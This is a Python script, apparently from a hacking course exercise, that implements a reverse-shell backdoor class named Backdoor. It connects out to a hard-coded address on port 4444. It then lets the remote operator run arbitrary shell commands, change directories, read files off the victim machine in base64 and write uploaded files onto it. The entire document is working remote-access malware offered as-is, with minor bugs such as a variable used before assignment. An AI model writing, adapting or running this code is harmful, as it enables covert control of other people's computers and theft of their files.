#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive(self):
        json_data = " "
        while True:
            try:
                json_data =json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute(self, command):
        return subprocess.check_output(command, shell=True)

    def write_file(self, path, content):
        file = open(path, "wb")
        file.write(base64.b64decode(content))
        return "[+] Download successfull"

    def read_file(self, path):
        file = open(path, 'rb')
        return base64.b64encode(file.read())

    def change_dir(self, path):
        os.chdir(path)
        return "[+] Path changed to "+ path


    def run(self):
        while True:
            command = self.receive()
            try:
                if command == "exit":
                    self.connection.close()
                    exit()
                elif command[0]=="cd" and len(command)>1:
                    command_result = self.change_dir(command[1])
                elif command[0] == "download" and "[-]Error" not in command_result:
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute(command)
                self.send(command_result)
            except Exception:
                return "[-] During Execution"


my_backdoor =  Backdoor("10.12.3.244 ", 4444)
my_backdoor.run()




